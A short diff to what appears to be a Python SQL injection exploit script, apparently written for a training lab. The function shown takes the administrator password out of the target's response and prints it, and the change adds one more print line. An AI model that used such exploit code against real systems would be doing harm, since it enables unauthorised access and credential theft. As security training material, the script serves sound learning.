@@ -17,6 +17,7 @@ def exploit_sqli_users_table(url):
         print('[+] Found the administrator password...')
         soup = BeautifulSoup(r.text, 'html.parser')
         admin_password = soup.find(text=re.compile('.*administrator.*')).split('**')[1]
+        print(admin_password)
         print(f'[+] The administrator password is {admin_password}')
         return True
     return False
